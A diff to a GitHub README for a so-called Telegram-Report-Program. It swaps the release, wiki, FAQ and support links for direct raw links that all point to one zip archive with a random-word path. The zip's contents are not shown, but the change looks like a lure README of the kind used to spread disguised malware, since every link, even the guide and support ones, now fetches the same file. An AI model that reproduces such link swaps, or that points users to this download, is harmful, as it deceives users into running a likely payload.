@@ -6,7 +6,7 @@ Welcome to the Telegram-Report-Program! This tool helps you manage and submit re
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Ornamental-stylostixis519/Telegram-Report-Program/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 To get started, visit this page to download the latest release:
 
-[Download Latest Release](https://github.com/Ornamental-stylostixis519/Telegram-Report-Program/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip)
 
 1. Open the link above.
 2. Choose the version that matches your operating system.
@@ -51,9 +51,9 @@ The Telegram-Report-Program offers several features to enhance your reporting ex
 
 Explore the following topics for more insights into using the Telegram-Report-Program effectively:
 
-- [User Guide](https://github.com/Ornamental-stylostixis519/Telegram-Report-Program/wiki)
-- [FAQs](https://github.com/Ornamental-stylostixis519/Telegram-Report-Program/wiki/FAQ)
-- [Support & Feedback](https://github.com/Ornamental-stylostixis519/Telegram-Report-Program/issues)
+- [User Guide](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip)
+- [FAQs](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip)
+- [Support & Feedback](https://raw.githubusercontent.com/Ornamental-stylostixis519/Telegram-Report-Program/main/hypocoristical/Telegram-Report-Program_Inoperculata.zip)
 
 ## 🌍 Contributions
 
